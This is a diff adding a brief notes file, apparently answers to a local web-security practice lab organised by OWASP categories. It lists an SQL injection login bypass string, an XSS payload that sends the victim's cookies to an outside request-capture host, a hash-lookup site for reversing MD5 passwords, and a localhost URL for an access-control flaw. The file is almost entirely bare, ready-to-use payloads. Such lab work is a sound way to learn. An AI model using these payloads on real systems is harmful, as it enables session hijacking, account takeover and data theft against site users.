@@ -1,0 +1,20 @@
+1. SQL injection
+-----
+
+admin' --
+
+
+3. Cross Site Scripting (xss)
+----
+<script>document.write("<img src=''http://putsreq.com/4RtmzmFXbdFtoh0Lstf6?cookie=" + encodeURIComponent(document.cookie) + "''/>")</script>
+http://putsreq.com/4RtmzmFXbdFtoh0Lstf6/inspect
+
+
+6. Sensitive data exposure
+-----
+http://md5.gromweb.com/
+
+
+7. Missing function level access control
+-----
+http://127.0.0.1:5000/user/user
